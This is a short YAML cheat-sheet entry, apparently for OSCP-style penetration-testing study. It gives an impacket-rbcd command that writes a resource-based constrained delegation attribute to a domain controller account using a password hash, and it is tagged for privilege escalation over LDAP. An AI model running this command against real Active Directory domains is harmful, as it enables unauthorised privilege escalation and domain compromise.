---
command: |
  impacket-rbcd -dc-ip $IP -action write -delegate-to "$DC$" -delegate-from "EVILPC$" -hashes :$HASH $DOMAIN/$USER
description: Write RBCD (Resource-Based Constrained Delegation) attribute to a machine account.
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [LDAP]
phase: [PrivEsc]
references:
  - https://github.com/fortra/impacket
---
